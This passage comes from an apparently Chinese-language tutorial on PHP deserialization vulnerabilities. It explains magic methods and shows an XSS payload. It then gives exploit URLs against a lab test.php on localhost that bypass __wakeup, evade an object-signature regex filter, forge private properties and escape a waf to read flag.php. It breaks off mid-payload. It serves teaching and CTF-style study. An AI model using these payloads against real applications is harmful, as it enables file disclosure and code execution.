operator">=</span> <span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$varr2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">echoP</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">varr1</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__construct&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__destruct&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"__toString&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__sleep&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'varr1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'varr2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token string double-quoted-string">"__wakeup&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//序列化对象，调用__construct()方法，输出__construct</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">echoP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用echoP()方法，输出"abc"</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>        <span class="token comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 </span><span class="token comment">//脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次）</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化漏洞例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"kawhi"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试构造序列化代码的时候插入xss</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=1 onerror=alert(1)>"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p><p><code>O</code>表示类型是object</p><p><code>1</code>表示object对应的类的名字的长度为1</p><p><code>“A”</code>表示类名</p><p><code>1</code>表示对应变量的个数</p><p><code>s</code>表示序列化后为字符串</p><p><code>4</code>表示字符串的长度</p><p><code>“test&quot;</code>表示表示变量名</p><p><code>s</code>表示变量test的类型</p><p><code>28</code>表示变量test的长度</p><p><code>&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</code>表示变量test的值</p><p><img src="https://s1.ax1x.com/2020/07/30/anGITe.png"></p><p>如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>，那么就是任意代码执行，危害就更大了。</p><br><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数</strong></p><p>例：在网站根目录下有两个文件flag.php和test.php</p><p>test.php源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造序列化代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果直接进行正常的反序列化的话，即</p><blockquote><p><a href="http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p></blockquote><p>页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径</p><p>php在解析属性长度的时候，若是出错</p><blockquote><p>将<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>改为</p><p><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p></blockquote><p>它并不会终止，而是继续执行，但不会调用__wakeup()</p><p>然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php</p><p>exp</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="OC绕过"><a href="#OC绕过" class="headerlink" title="OC绕过"></a>OC绕过</h3><p>对test.php进行修改</p><p>对传进来的file进行过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[OC]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacking!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正则表达式中对file进行了过滤</p><p>当遇到 字母<code>O</code>或<code>C</code> 加上<code>:</code>，再加上一段数字和<code>:</code>，后面的 i 表示不区分大小写 时，则die掉。</p><p>该正则表达式匹配的部分为：<code>O:1:</code></p><p>若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配</p><p>对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过</p><p>但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用<code>+</code>的URL编码：<code>%2b</code>代替</p><p>即：</p><blockquote><p>O:%2b1:</p></blockquote><p>exp</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p><a href="https://www.cnblogs.com/jsdd/p/11603919.html">php中的访问类型（public，private，protected）</a></p><p>public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。</p><p>private 私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。</p><p>protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。</p><blockquote><p>public 表示全局，类内部外部子类都可以访问；<br>private 表示私有的，只有本类内部可以使用；<br>protected 表示受保护的，只有本类或子类或父类中可以访问；</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span>    <span class="token keyword">private</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$test3</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/10/07/0ahFhQ.png"></p><p>test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同</p><p>private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11</p><p>protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8</p><blockquote><p>%00是不可见字符</p></blockquote><br><p>对test.php继续进行修改</p><p>将public改为private</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[OC]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacking!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化带private属性的file</p><p><code>&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>将<code>file</code>改为<code>%00A%00file</code>，对应的长度改为<code>7</code></p><p>即：</p><blockquote><p>{s:7:”%00A%00file”;s:8:”flag.php”;}</p></blockquote><p>exp</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>在网站根目录下有两个文件，test.php和flag.php</p><p>test.php源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=></span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload：</p><p>首先要有个<code>&quot;;</code>使前面的字符串闭合</p><p>接下来是常规的序列化后的数组元素</p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>但在waf()函数中，对序列化后的$a进行替换，所以将<code>s</code>改为<code>S</code>，将<code>flag.php</code>改为十六进制的<code>\66\6C\61\67\2E\70\68\70</code>，即</p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;</code></p><p>最后再加上<code>&#125;</code>使前面数组a的<code>&#123;</code>闭合</p><p>所以合起来是</p><p><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'";i:0;O:1:"A":1:&#123;s:8:"filename";S:8:"\66\6C\61\67\2E\70\68\70";&#125;&#125;'</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><p><code>a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;</code></p><p>所以该段字符串有65个字符</p><p>利用waf()函数将flag替换为index会增加一个字符，构造65个flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">*</span><span class="token number">65</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将输出结果和前面的字符串拼接在一起，得到payload</p><pre 